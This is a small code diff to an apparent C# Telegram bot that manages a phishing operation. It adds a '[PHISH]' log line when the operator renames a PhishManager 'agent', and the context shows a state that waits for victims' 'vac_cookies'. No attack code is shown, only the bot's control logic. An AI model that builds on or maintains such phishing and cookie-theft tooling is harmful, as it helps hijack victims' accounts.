@@ -142,6 +142,7 @@ namespace FinalBot
                     _userState.Remove(message.Chat.Id);
                     PhishManager.SetAgentName(text); 
                     await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Имя агента успешно поменял:</b> <code>{text}</code>", parseMode: ParseMode.Html);
+                    Log($"[PHISH] Agent name updated to: {text}");
                     return;
                 }
                 else if (state == "awaiting_vac_cookies")
